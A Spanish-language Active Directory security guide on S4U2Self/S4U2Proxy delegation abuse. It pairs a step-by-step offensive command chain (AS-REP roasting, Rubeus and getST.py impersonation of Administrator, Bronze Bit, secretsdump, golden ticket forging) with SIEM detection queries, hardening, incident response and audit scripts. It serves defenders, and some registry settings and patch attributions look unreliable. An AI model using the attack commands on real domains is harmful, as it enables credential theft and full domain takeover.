# 🛑 Ataques de **S4U2Self/S4U2Proxy Abuse en Active Directory**

---

## 📝 ¿Qué es S4U2Self/S4U2Proxy Abuse y por qué es peligroso?

| Concepto      | Descripción                                                                                                       |
|---------------|------------------------------------------------------------------------------------------------------------------|
| **Definición**| Abuso de las extensiones de protocolo Kerberos S4U (Service for User) que permite a servicios obtener tickets en nombre de usuarios sin necesidad de sus credenciales o TGTs, combinando S4U2Self y S4U2Proxy para suplantación completa. |
| **Finalidad** | S4U2Self permite a un servicio obtener un ticket hacia sí mismo en nombre de cualquier usuario, y S4U2Proxy permite usar ese ticket para acceder a otros servicios. Su abuso permite escalada de privilegios masiva y suplantación de identidad sin credenciales del usuario objetivo. |

---

## 🛠️ ¿Cómo funciona y cómo se explota S4U2Self/S4U2Proxy? (TTPs y ejemplos)

| Vector/Nombre              | Descripción breve                                                                                   |
|----------------------------|----------------------------------------------------------------------------------------------------|
| **S4U2Self sin autenticación previa** | Un atacante con control de una cuenta de servicio solicita tickets para cualquier usuario sin necesidad de sus credenciales. |
| **S4U2Proxy para servicios remotos** | Usa tickets obtenidos con S4U2Self para acceder a servicios remotos en la lista de delegación autorizada. |
| **Bronze Bit Attack** | Manipula el flag 'forwardable' en tickets S4U2Self para saltarse restricciones de delegación. |
| **Cross-domain S4U abuse** | Explota S4U entre dominios con trust para escalada de privilegios inter-dominio. |
| **Service Ticket manipulation** | Modifica propiedades de tickets S4U para cambiar servicios objetivo (HTTP→CIFS→LDAP). |
| **Machine Account S4U** | Usa cuentas de máquina comprometidas para realizar S4U hacia servicios de alto privilegio. |
| **gMSA account abuse** | Compromete Group Managed Service Accounts y abusa de sus capacidades S4U. |

---

## 💻 Ejemplo práctico ofensivo (paso a paso)

```bash
# 1. Comprometer cuenta de servicio (ejemplo: AS-REP Roasting + cracking)
GetNPUsers.py soporte.htb/ -usersfile usuarios.txt -format hashcat -outputfile asrep_hashes.txt
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# 2. Verificar capacidades de delegación de la cuenta comprometida
findDelegation.py -target-domain soporte.htb -hashes :aad3b435b51404eeaad3b435b51404ee

# 3. S4U2Self - Obtener ticket para Administrator hacia el servicio comprometido
.\Rubeus.exe s4u /user:srv-sql$ /rc4:aad3b435b51404eeaad3b435b51404ee /impersonateuser:Administrator /self /domain:soporte.htb /dc:dc.soporte.htb

# 4. S4U2Proxy - Usar el ticket S4U2Self para acceder a servicios autorizados
.\Rubeus.exe s4u /user:srv-sql$ /rc4:aad3b435b51404eeaad3b435b51404ee /impersonateuser:Administrator /msdsspn:MSSQLSvc/db.soporte.htb:1433 /domain:soporte.htb /dc:dc.soporte.htb /ptt

# 5. Alternativamente, usando getST.py para el flujo completo
getST.py -spn MSSQLSvc/db.soporte.htb:1433 -impersonate Administrator soporte.htb/srv-sql$ -hashes :aad3b435b51404eeaad3b435b51404ee

# 6. Bronze Bit Attack - Modificar forwardable flag si es necesario
.\Rubeus.exe s4u /user:srv-sql$ /rc4:aad3b435b51404eeaad3b435b51404ee /impersonateuser:Administrator /self /bronzebit /domain:soporte.htb

# 7. Escalada cross-domain usando S4U
.\Rubeus.exe s4u /user:srv-cross$ /rc4:aad3b435b51404eeaad3b435b51404ee /impersonateuser:Administrator /msdsspn:LDAP/dc.external.htb /domain:soporte.htb /dc:dc.soporte.htb

# 8. Machine Account S4U abuse (si se compromete una máquina)
.\Rubeus.exe s4u /user:WORKSTATION01$ /rc4:aad3b435b51404eeaad3b435b51404ee /impersonateuser:Administrator /msdsspn:HOST/dc.soporte.htb /self

# 9. Usar ticket obtenido para acceso privilegiado
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-wmiexec -k -no-pass soporte.htb/Administrator@db.soporte.htb

# 10. Persistence usando S4U hacia múltiples servicios
for service in CIFS HOST LDAP HTTP; do
    getST.py -spn $service/dc.soporte.htb -impersonate Administrator soporte.htb/srv-sql$ -hashes :aad3b435b51404eeaad3b435b51404ee -out $service.ccache
done

# 11. Golden ticket creation using LDAP access
impacket-secretsdump -k -no-pass soporte.htb/Administrator@dc.soporte.htb
impacket-ticketer -nthash a9fdfa038c4b75ebc76dc855dd74f0da -domain-sid S-1-5-21-... -domain soporte.htb Administrator
```

---

## 📊 Detección en logs y SIEM (Splunk)

| Campo clave                     | Descripción                                                                  |
|---------------------------------|------------------------------------------------------------------------------|
| **EventCode = 4769**            | Solicitudes TGS con patrones S4U específicos (opciones 0x40810010 y 0x40810000). |
| **EventCode = 4770**            | Renovación de tickets de servicio que pueden indicar persistencia S4U.        |
| **EventCode = 4624**            | Logons de red usando tickets S4U con patrones de tiempo específicos.          |
| **ServiceName patterns**        | Secuencias de servicios (self→target) que indican flujo S4U2Self→S4U2Proxy.   |
| **CommandLine/Image (Sysmon)**  | Procesos como Rubeus.exe con parámetros /s4u, /self, /bronzebit, getST.py.    |

### Query Splunk: Detección de flujo S4U2Self→S4U2Proxy

```splunk
index=wineventlog EventCode=4769
| search TicketOptions="0x40810010" OR TicketOptions="0x40810000"
| eval S4UType=case(TicketOptions="0x40810010", "S4U2Self", TicketOptions="0x40810000", "S4U2Proxy", 1=1, "Unknown")
| sort _time
| streamstats count by TargetUserName, IpAddress reset_after="S4UType=\"S4U2Self\""
| where S4UType="S4U2Proxy" AND count > 1
| table _time, TargetUserName, ServiceName, IpAddress, S4UType
```

### Query: Bronze Bit Attack detection

```splunk
index=sysmon_logs EventCode=1
| search CommandLine="*bronzebit*" OR CommandLine="*forwardable*" OR (CommandLine="*s4u*" AND CommandLine="*self*")
| table _time, Computer, User, Image, CommandLine
```

### Query: Abuso masivo de S4U (indicador de automatización)

```splunk
index=wineventlog EventCode=4769 TicketOptions="0x40810010"
| stats count by TargetUserName, IpAddress, bin(_time, 5m)
| where count > 10
| sort - count
```

### Query: Cross-domain S4U abuse

```splunk
index=wineventlog EventCode=4769
| search TicketOptions="0x40810000"
| rex field=ServiceName "(?<Service>[^/]+)/(?<TargetHost>[^.]+)\.(?<TargetDomain>.*)"
| search TargetDomain!="soporte.htb"
| table _time, TargetUserName, ServiceName, TargetDomain, IpAddress
```

---

## 🛡️ Detección con Windows Defender for Endpoint

### Reglas de detección personalizadas

```kql
// S4U2Self/S4U2Proxy - Detección de abuso directo
DeviceProcessEvents
| where ProcessCommandLine has_any ("s4u", "/self", "S4U2Self", "S4U2Proxy", "bronzebit")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FileName
| order by Timestamp desc
```

```kql
// Bronze Bit Attack detection
DeviceProcessEvents
| where ProcessCommandLine has_any ("bronzebit", "forwardable") and ProcessCommandLine has "s4u"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, SHA256
| order by Timestamp desc
```

```kql
// Detección de secuencias S4U automatizadas
DeviceProcessEvents
| where ProcessCommandLine has "s4u"
| summarize S4UCount = count(), Commands = make_set(ProcessCommandLine) by DeviceName, AccountName, bin(Timestamp, 5m)
| where S4UCount > 5
| project Timestamp, DeviceName, AccountName, S4UCount, Commands
```

```kql
// Correlación: Compromiso de servicio → S4U abuse
DeviceProcessEvents
| where ProcessCommandLine has_any ("GetNPUsers", "GetUserSPNs", "AS-REP", "Kerberoasting")
| extend CompromiseTime = Timestamp
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("s4u", "getST", "impersonate")
    | extend S4UTime = Timestamp
) on DeviceName
| where S4UTime - CompromiseTime between (0s .. 2h)
| project CompromiseTime, S4UTime, DeviceName, ProcessCommandLine, ProcessCommandLine1
```

### Alertas recomendadas

| Regla | Descripción | Severidad |
|-------|-------------|-----------|
| **S4U Abuse Pattern** | Detección de uso de S4U2Self/S4U2Proxy | Alta |
| **Bronze Bit Attack** | Manipulación de flags forwardable en tickets | Crítica |
| **Mass S4U Requests** | Múltiples solicitudes S4U en corto tiempo | Alta |
| **Cross-Domain S4U** | S4U hacia dominios externos | Media |
| **Service Compromise → S4U** | Secuencia de compromiso seguida de S4U | Crítica |

---

## 🦅 Detección con CrowdStrike Falcon

### Hunting queries (Event Search)

```sql
-- Detección de herramientas S4U
event_platform=Win event_simpleName=ProcessRollup2
| search (CommandLine=*s4u* OR CommandLine=*S4U2Self* OR CommandLine=*S4U2Proxy* OR CommandLine=*bronzebit*)
| table _time, ComputerName, UserName, FileName, CommandLine, SHA256HashData
| sort - _time
```

```sql
-- Detección de Bronze Bit Attack
event_platform=Win event_simpleName=ProcessRollup2
| search CommandLine=*bronzebit*
| table _time, ComputerName, UserName, CommandLine, ParentProcessId, ParentBaseFileName
| sort - _time
```

```sql
-- Patrones de S4U en autenticación
event_platform=Win event_simpleName=AuthActivityAuditLog
| search (ServiceName=*self* OR DelegationType=S4U*)
| table _time, ComputerName, UserName, ServiceName, TargetUserName, DelegationType
| sort - _time
```

### Custom IOAs (Indicators of Attack)

```sql
-- IOA para detectar flujos S4U anómalos
event_platform=Win event_simpleName=KerberosLogon
| search TargetUserName=Administrator ServiceName=*
| stats count by ComputerName, ServiceName, bin(_time, 10m)
| where count > 8
```

---

## 🔍 Queries KQL para Microsoft Sentinel

### Detección de S4U2Self/S4U2Proxy Abuse

```kql
// Query principal para detectar abuso de S4U
SecurityEvent
| where EventID == 4769 // Service ticket request
| where TicketOptions in ("0x40810010", "0x40810000") // S4U flags
| extend S4UType = case(TicketOptions == "0x40810010", "S4U2Self", 
                       TicketOptions == "0x40810000", "S4U2Proxy", "Other")
| summarize S4UCount = count(), Services = make_set(ServiceName) by TargetUserName, IpAddress, S4UType, bin(TimeGenerated, 5m)
| where S4UCount > 3
| project TimeGenerated, TargetUserName, IpAddress, S4UType, S4UCount, Services
```

```kql
// Detección de Bronze Bit Attack
DeviceProcessEvents
| where ProcessCommandLine has "bronzebit" or (ProcessCommandLine has "s4u" and ProcessCommandLine has "forwardable")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, FileName
| order by TimeGenerated desc
```

### Hunting avanzado

```kql
// Correlación: AS-REP/Kerberoasting → S4U abuse
DeviceProcessEvents
| where ProcessCommandLine has_any ("GetNPUsers", "GetUserSPNs", "Rubeus", "kerberoast")
| extend AttackTime = TimeGenerated
| join kind=inner (
    DeviceProcessEvents
    | where ProcessCommandLine has_any ("s4u", "getST", "impersonate")
    | extend S4UTime = TimeGenerated
) on DeviceName
| where S4UTime - AttackTime between (0s .. 4h)
| project AttackTime, S4UTime, DeviceName, ProcessCommandLine, ProcessCommandLine1
```

```kql
// Detección de escalada S4U hacia servicios críticos del DC
SecurityEvent
| where EventID == 4769 and TicketOptions == "0x40810000" // S4U2Proxy
| where ServiceName has_any ("LDAP/", "CIFS/", "HOST/") and ServiceName contains "dc."
| where TargetUserName in ("Administrator", "krbtgt")
| project TimeGenerated, Computer, ServiceName, TargetUserName, IpAddress
```

```kql
// Detección de persistencia usando múltiples servicios S4U
SecurityEvent
| where EventID == 4769 and TicketOptions == "0x40810000"
| summarize Services = dcount(ServiceName), ServiceList = make_set(ServiceName) by TargetUserName, IpAddress, bin(TimeGenerated, 1h)
| where Services > 4
| project TimeGenerated, TargetUserName, IpAddress, Services, ServiceList
```

---

## 🦾 Hardening y mitigación

| Medida                                         | Descripción                                                                                       |
|------------------------------------------------|--------------------------------------------------------------------------------------------------|
| **Eliminación de S4U innecesario**             | Auditar y remover capacidades S4U de cuentas que no las requieren operacionalmente.             |
| **Protected Users Group expansivo**            | Agregar todas las cuentas administrativas y de servicio crítico al grupo Protected Users.        |
| **Account is sensitive configuration**         | Marcar cuentas de alto privilegio como sensibles para prevenir delegación.                       |
| **Segregación de cuentas de servicio**         | Separar cuentas con capacidades S4U en OUs dedicadas con políticas restrictivas.                |
| **Monitorización continua de S4U**             | SIEM configurado para alertar ante cualquier uso de S4U2Self/S4U2Proxy.                         |
| **Credential rotation automática**             | Rotación frecuente de credenciales de cuentas con capacidades de delegación.                     |
| **Zero Trust Service Authentication**          | Validación continua de autenticación en servicios críticos independiente de S4U.                |
| **Bronze Bit mitigation**                      | Configuraciones específicas que previenen manipulación de flags forwardable.                     |
| **Cross-domain restrictions**                  | Limitaciones estrictas en capacidades S4U entre dominios con trust.                              |
| **Service account baseline security**          | Configuraciones mínimas de seguridad para todas las cuentas con SPNs.                           |

---

## 🚨 Respuesta ante incidentes

1. **Identificar la cuenta comprometida** con capacidades S4U (servicio/máquina/usuario).
2. **Revisar logs de S4U** en las últimas 24-48 horas desde la cuenta comprometida.
3. **Inventariar servicios accedidos** usando tickets S4U obtenidos de forma maliciosa.
4. **Cambiar credenciales** de la cuenta comprometida y cuentas relacionadas inmediatamente.
5. **Revocar todos los tickets activos** asociados con la cuenta comprometida.
6. **Auditar cambios realizados** en sistemas accedidos mediante S4U abuse.
7. **Implementar monitorización reforzada** en servicios que fueron objetivo del ataque.
8. **Revisar y fortalecer** configuraciones de delegación en todo el entorno.
9. **Buscar indicadores** de persistencia (Golden tickets, backdoors de delegación).

---

## 🧑‍💻 ¿Cómo revisar capacidades S4U? (PowerShell)

### Identificar cuentas con capacidades de delegación

```powershell
# Buscar cuentas con TrustedToAuthForDelegation (protocol transition)
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $True} -Properties TrustedToAuthForDelegation,ServicePrincipalName |
Select-Object Name,TrustedToAuthForDelegation,ServicePrincipalName

Get-ADUser -Filter {TrustedToAuthForDelegation -eq $True} -Properties TrustedToAuthForDelegation,ServicePrincipalName |
Select-Object Name,TrustedToAuthForDelegation,ServicePrincipalName
```

### Auditar eventos S4U en logs de seguridad

```powershell
# Buscar eventos S4U2Self (4769 con opciones específicas)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} |
Where-Object {$_.Message -like "*0x40810010*"} |
Select-Object TimeCreated,@{Name='User';Expression={($_.Properties[0].Value)}},@{Name='Service';Expression={($_.Properties[1].Value)}}
```

### Revisar configuraciones críticas de delegación

```powershell
# Script completo para auditar S4U
$S4UCapableComputers = Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $True} -Properties TrustedToAuthForDelegation,ServicePrincipalName,msDS-AllowedToDelegateTo
$S4UCapableUsers = Get-ADUser -Filter {TrustedToAuthForDelegation -eq $True} -Properties TrustedToAuthForDelegation,ServicePrincipalName,msDS-AllowedToDelegateTo

Write-Host "=== CUENTAS CON CAPACIDADES S4U ===" -ForegroundColor Yellow
Write-Host "Equipos: $($S4UCapableComputers.Count)" -ForegroundColor Cyan
Write-Host "Usuarios: $($S4UCapableUsers.Count)" -ForegroundColor Cyan

# Mostrar detalles de cada cuenta
foreach ($Computer in $S4UCapableComputers) {
    Write-Host "Equipo: $($Computer.Name)" -ForegroundColor White
    Write-Host "  SPNs: $($Computer.ServicePrincipalName -join ', ')" -ForegroundColor Gray
    Write-Host "  Puede delegar a: $($Computer.'msDS-AllowedToDelegateTo' -join ', ')" -ForegroundColor Gray
}
```

### Buscar Bronze Bit Attack en logs

```powershell
# Buscar manipulación de flags forwardable en logs de eventos
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4769} |
Where-Object {$_.Message -like "*forwardable*" -or $_.Message -like "*bronzebit*"} |
Select-Object TimeCreated,Id,@{Name='Details';Expression={$_.Message.Split("`n")[0]}}
```

### Script de auditoría de seguridad S4U

```powershell
# Auditoría completa de riesgos S4U
function Test-S4USecurity {
    Write-Host "=== AUDITORÍA DE SEGURIDAD S4U ===" -ForegroundColor Yellow
    
    # 1. Cuentas con protocol transition
    $ProtocolTransitionAccounts = @()
    $ProtocolTransitionAccounts += Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $True}
    $ProtocolTransitionAccounts += Get-ADUser -Filter {TrustedToAuthForDelegation -eq $True}
    
    Write-Host "Cuentas con Protocol Transition: $($ProtocolTransitionAccounts.Count)" -ForegroundColor $(if($ProtocolTransitionAccounts.Count -gt 0){"Red"}else{"Green"})
    
    # 2. Cuentas en Protected Users
    $ProtectedUsers = Get-ADGroupMember -Identity "Protected Users" -ErrorAction SilentlyContinue
    Write-Host "Cuentas en Protected Users: $($ProtectedUsers.Count)" -ForegroundColor $(if($ProtectedUsers.Count -lt 5){"Yellow"}else{"Green"})
    
    # 3. Cuentas marcadas como sensibles
    $SensitiveAccounts = Get-ADUser -Filter {AccountNotDelegated -eq $true}
    Write-Host "Cuentas marcadas como sensibles: $($SensitiveAccounts.Count)" -ForegroundColor $(if($SensitiveAccounts.Count -lt 10){"Yellow"}else{"Green"})
    
    # 4. Recomendaciones
    Write-Host "`n=== RECOMENDACIONES ===" -ForegroundColor Yellow
    if ($ProtocolTransitionAccounts.Count -gt 0) {
        Write-Host "⚠️  Revisar necesidad de Protocol Transition en:" -ForegroundColor Red
        $ProtocolTransitionAccounts.Name | ForEach-Object { Write-Host "   - $_" -ForegroundColor Red }
    }
    
    if ($ProtectedUsers.Count -lt 5) {
        Write-Host "⚠️  Agregar más cuentas críticas a Protected Users" -ForegroundColor Yellow
    }
    
    if ($SensitiveAccounts.Count -lt 10) {
        Write-Host "⚠️  Marcar más cuentas como sensibles (Account is sensitive)" -ForegroundColor Yellow
    }
}

Test-S4USecurity
```

---

## 🧠 Soluciones innovadoras y hardening avanzado

- **Behavioral analysis de patrones S4U:**  
  Machine Learning que aprende patrones normales de uso S4U y detecta anomalías.
- **Honeypots de servicios S4U:**  
  Cuentas trampa con capacidades S4U que alertan ante cualquier uso no autorizado.
- **Zero Trust Service Mesh:**  
  Validación continua de identidad independiente de tickets Kerberos obtenidos via S4U.
- **Integración con Threat Intelligence:**  
  Correlación automática con campañas conocidas de abuso S4U y Bronze Bit attacks.
- **SOAR automation para S4U:**  
  Playbooks que automáticamente revocan capacidades S4U ante detección de abuso.
- **Dynamic delegation policies:**  
  Políticas que se ajustan automáticamente basadas en riesgo y contexto operacional.
- **S4U audit blockchain:**  
  Registro inmutable de todas las operaciones S4U para auditoría forense avanzada.

---

## 🔧 Parches y actualizaciones

| Parche/Update | Descripción                                                                                  |
|---------------|----------------------------------------------------------------------------------------------|
| **KB5008102** | Windows 11/10/Server - Correcciones críticas en validación S4U (CVE-2021-42278/42287).    |
| **KB5025238** | Windows 11 22H2 - Mejoras en controles de Bronze Bit y manipulación de flags.              |
| **KB5022906** | Windows Server 2022 - Fortalecimiento de validaciones S4U2Self/S4U2Proxy.                  |
| **KB4580390** | Windows Server 2016 - Mejoras en auditoría y logging de operaciones S4U.                   |
| **KB5014754** | Correcciones relacionadas con certificados AD y S4U (CVE-2022-26923).                      |
| **Bronze Bit mitigation** | Actualizaciones específicas para prevenir manipulación de forwardable flag.         |

### Configuraciones de registro críticas

```powershell
# Habilitar auditoría detallada de S4U
auditpol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
auditpol /set /subcategory:"Special Logon" /success:enable /failure:enable

# Configurar logging extendido para S4U
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "LogLevel" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "AuditSpecialGroups" -Value 1

# Bronze Bit mitigation
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "RequireStrictKdcValidation" -Value 1
```

### Configuraciones de GPO críticas

```powershell
# Configurar Protected Users Group para cuentas críticas
$CriticalAccounts = Get-ADUser -Filter {AdminCount -eq 1}
foreach ($Account in $CriticalAccounts) {
    Add-ADGroupMember -Identity "Protected Users" -Members $Account.SamAccountName
}

# Configurar Account is sensitive para prevenir delegación
Get-ADUser -Filter {AdminCount -eq 1} | Set-ADUser -AccountNotDelegated $true

# Restringir Protocol Transition a cuentas específicas
# Computer Configuration\Policies\Windows Settings\Security Settings\Local Policies\User Rights Assignment
# "Enable computer and user accounts to be trusted for delegation" - Solo cuentas autorizadas específicamente
```

### Scripts de validación post-configuración

```powershell
# Verificar mitigaciones Bronze Bit
$BronzeBitMitigation = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "RequireStrictKdcValidation" -ErrorAction SilentlyContinue

if ($BronzeBitMitigation.RequireStrictKdcValidation -eq 1) {
    Write-Host "✓ Bronze Bit mitigation habilitada" -ForegroundColor Green
} else {
    Write-Host "✗ Bronze Bit mitigation NO habilitada" -ForegroundColor Red
}

# Verificar Protected Users configuration
$ProtectedUsersCount = (Get-ADGroupMember -Identity "Protected Users").Count
$AdminAccounts = (Get-ADUser -Filter {AdminCount -eq 1}).Count

if ($ProtectedUsersCount -ge ($AdminAccounts * 0.8)) {
    Write-Host "✓ Suficientes cuentas en Protected Users ($ProtectedUsersCount/$AdminAccounts)" -ForegroundColor Green
} else {
    Write-Host "✗ Pocas cuentas en Protected Users ($ProtectedUsersCount/$AdminAccounts)" -ForegroundColor Yellow
}

# Verificar que no hay Protocol Transition innecesario
$UnnecessaryS4U = Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $True -and ServicePrincipalName -notlike "*"}
if ($UnnecessaryS4U.Count -eq 0) {
    Write-Host "✓ No se encontró Protocol Transition innecesario" -ForegroundColor Green
} else {
    Write-Host "✗ CRÍTICO: $($UnnecessaryS4U.Count) cuentas con Protocol Transition sin SPNs" -ForegroundColor Red
}
```

---

## 📚 Referencias

- [S4U2Self/S4U2Proxy - Microsoft Documentation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a)
- [Rubeus S4U Implementation](https://github.com/GhostPack/Rubeus#s4u)
- [Bronze Bit Attack - netsec.expert](https://blog.netsec.expert/2021/11/08/the-bronze-bit-attack/)
- [Impacket getST.py S4U](https://github.com/fortra/impacket/blob/master/examples/getST.py)
- [S4U Attacks - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-delegation)
- [CVE-2021-42278/42287 - S4U implications](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [BloodHound S4U Edges](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html)

---